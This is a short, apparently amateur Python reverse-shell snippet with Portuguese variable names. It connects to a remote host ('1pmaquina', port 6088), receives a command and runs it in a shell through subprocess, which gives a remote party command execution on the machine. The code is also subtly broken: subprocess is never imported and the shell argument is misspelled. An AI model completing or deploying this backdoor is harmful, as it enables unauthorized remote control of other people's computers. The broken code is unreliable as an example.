import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('1pmaquina', 6088))
comando_recebido = s.recv(1024).decode()
comando_execut = subprocess.Popen(comando_recebido, shee=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE)
